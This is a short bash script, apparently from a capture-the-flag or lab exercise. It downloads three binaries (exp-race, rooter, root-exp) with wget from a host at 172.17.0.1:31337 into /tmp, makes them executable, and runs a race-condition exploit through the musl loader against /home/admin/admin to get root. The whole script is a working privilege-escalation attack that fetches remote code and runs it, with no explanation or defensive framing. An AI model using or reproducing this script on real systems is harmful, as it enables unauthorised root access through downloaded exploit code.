#!/bin/bash

HOST=172.17.0.1:31337

cd /tmp

rm exp-race
rm rooter
rm root-exp
wget http://$HOST/exp-race
wget http://$HOST/rooter
wget http://$HOST/root-exp
chmod +x exp-race
chmod +x root-exp

rm -f /tmp/false /tmp/good
(cat /tmp/rooter && cat) | /lib/ld-musl-x86_64.so.1 /tmp/exp-race /home/admin/admin
